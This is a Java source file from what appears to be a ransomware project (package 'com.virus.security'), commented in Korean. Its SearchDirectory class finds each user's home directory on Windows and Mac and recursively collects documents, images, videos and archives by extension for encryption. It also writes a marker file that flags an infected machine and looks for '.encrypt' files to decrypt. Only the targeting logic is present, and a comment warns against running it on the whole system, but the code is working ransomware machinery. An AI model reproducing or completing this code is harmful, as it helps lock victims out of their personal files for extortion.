package com.virus.security;

import org.apache.commons.io.FilenameUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;

/**
 * Created by codertimo on 15. 11. 16.
 */
public class SearchDirectory {


    private String defaultDirectory;
    private boolean isWindow;
    private ArrayList<File> allFiles = new ArrayList<>();
    private ArrayList<File> encryptedFiles = new ArrayList<>();

    private ArrayList<String> containsFilters = new ArrayList<>();


    public SearchDirectory() {
        /**
         * !!!주의!!!
         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectory()를 사용하여 테스트를 하지 마세요
         * 본인의 컴퓨터가 암호화 될 수 있습니다
         **/

        //1. 암호화 할 경로 설정
        isWindow = true;
        setDefaultDirectory("C:\\test");

        //setDefaultDirectory();

        //2. 암호화할 파일 타입을 설정
        initContainFilter();
    }

    /**
     * 현재 이 컴퓨터가 암호화 되어있는 상태인지 helloworld.temp의 파일 여부로 결정하는 함수
     *
     * @return
     */
    public boolean isEncrypted() {
        File file = new File(defaultDirectory);
        for (File f : file.listFiles()) {
            if (f.getName().equals("helloworld.temp")) {
                return true;
            }
        }
        return false;
    }

    /**
     * helloworld.temp파일을 생성함으로서 이 컴퓨터가 암호화 되었다는 지표를 남기는 함수
     */
    public void setEncrypted() {
        try {
            if (defaultDirectory.endsWith("/") || defaultDirectory.endsWith("\\")) {
                FileOutputStream output = new FileOutputStream(defaultDirectory + "helloworld.temp");
                output.close();
            } else {
                if (isWindow) {
                    FileOutputStream output = new FileOutputStream(defaultDirectory + "\\helloworld.temp");
                    output.close();
                } else {
                    FileOutputStream output = new FileOutputStream(defaultDirectory + "/helloworld.temp");
                    output.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * helloworld.temp파일을 제거하는 함수
     */
    public void setDecrypted() {
        if (defaultDirectory.endsWith("/") || defaultDirectory.endsWith("\\")) {
            File file = new File(defaultDirectory + "helloworld.temp");
            file.delete();
        } else {
            if (isWindow) {
                File file = new File(defaultDirectory + "\\helloworld.temp");
                file.delete();
            } else {
                File file = new File(defaultDirectory + "/helloworld.temp");
                file.delete();
            }
        }
    }

    /**
     * 암호화할 컴퓨터 내의 모든 파일 검색후 반환
     *
     * @return 찾아낸 모든 파일의 list 넘김
     */
    public ArrayList<File> allFileSearch() {

        System.out.println("디렉토리 검색 시작");

        System.out.println(defaultDirectory);

        getFileList(defaultDirectory);
        System.out.println("디렉토리 검색 끝");

        return allFiles;
    }

    /**
     * 복호화할 파일을 검색후 반환
     *
     * @return 복호화 할 파일
     */
    public ArrayList<File> decryptSearch() {

        System.out.println("디렉토리 검색 시작");
        System.out.println(defaultDirectory);

        getEncryptedList(defaultDirectory);

        System.out.println("디렉토리 검색 끝");

        return encryptedFiles;
    }


    /**
     * 암호화할 파일의 확장자 설정
     */
    private void initContainFilter() {
        containsFilters.add("jpg");
        containsFilters.add("docx");
        containsFilters.add("hwp");
        containsFilters.add("pptx");
        containsFilters.add("ppt");
        containsFilters.add("avi");
        containsFilters.add("mp4");
        containsFilters.add("mkv");
        containsFilters.add("max");
        containsFilters.add("cad");
        containsFilters.add("zip");
        containsFilters.add("pdf");
        containsFilters.add("psd");
        containsFilters.add("txt");
        containsFilters.add("png");
        containsFilters.add("mp3");
    }


    /**
     * OS별 최상위 디렉토리 설정
     */
    private void setDefaultDirectory() {
        String os = System.getProperty("os.name").split(" ")[0];
        switch (os) {
            case "Mac":
                setMacDefaultDirectory();
                this.isWindow = false;
                break;

            case "Windows":
                setWindowDefaultDirectory();
                this.isWindow = true;
                break;
        }
    }

    /**
     * 최상위 디렉토리 사용자 설정
     *
     * @param defaultDirectory
     */
    private void setDefaultDirectory(String defaultDirectory) {
        this.defaultDirectory = defaultDirectory;
    }

    /**
     * 기본 디렉토리 설정 : Mac 용
     */
    private void setMacDefaultDirectory() {
        File macDir = new File("/Users/");
        File[] fileList = macDir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    System.out.println(file.getName());
                    if (!file.getName().equals("Guest") && !file.getName().equals("Shared")) {
                        this.defaultDirectory = file.getCanonicalPath();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * 기본 디렉토리 설정 : Window용
     */
    private void setWindowDefaultDirectory() {
        File windowDir = new File(System.getenv("SystemDrive") + "\\Users\\");
        File[] fileList = windowDir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    if (!file.getName().equals("Public")) {
                        this.defaultDirectory = file.getCanonicalPath();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * souce에 주어진 경로에 있는 모든 파일을 훑음, 또한 하위 디렉토리 존재시, 재귀로 다시 호출
     *
     * @param source
     */
    private void getFileList(String source) {
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    if (file.isFile()) {

                        // 파일이 있다면 파일 추가
                        if (isAvailableFile(file)) {
                            allFiles.add(file);
                        }
                    } else if (file.isDirectory()) {
                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                        System.out.println(file.getCanonicalPath());
                        getFileList(file.getCanonicalPath());
                        System.out.println("----------------------");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 복호화할 파일 검색 알고리즘
     *
     * @param source
     */
    private void getEncryptedList(String source) {
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    if (file.isFile()) {
                        // 파일이 있다면 파일 추가
                        if (FilenameUtils.getExtension(file.getName()).equals("encrypt")) {
                            encryptedFiles.add(file);
                        }
                    } else if (file.isDirectory()) {
                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                        System.out.println(file.getCanonicalPath());
                        getEncryptedList(file.getCanonicalPath());
                        System.out.println("----------------------");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 필터에 부합하는 파일인지 확인
     *
     * @param file
     * @return
     */

    private boolean isAvailableFile(File file) {
        return this.containsFilters.contains(FilenameUtils.getExtension(file.getName()));
    }

    /**
     * 검색한 파일 인덱스 제거
     */
    public void clearFiles() {
        this.encryptedFiles.clear();
        this.allFiles.clear();
    }
}
